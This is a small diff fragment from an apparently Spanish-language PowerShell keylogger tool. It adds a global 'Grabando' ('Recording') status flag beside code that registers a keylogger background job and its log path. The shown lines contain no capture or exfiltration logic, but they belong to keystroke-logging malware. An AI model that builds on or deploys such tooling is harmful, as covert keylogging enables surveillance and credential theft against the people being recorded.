@@ -75,6 +75,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }    
         $GLOBAL:joblist["keylogger"]= $job
         $GLOBAL:joblist["keylog_path"]= $ruta
+        $GLOBAL:execute = "Grabando"
     }
     else{
         $job = $Global:joblist["keylogger"]
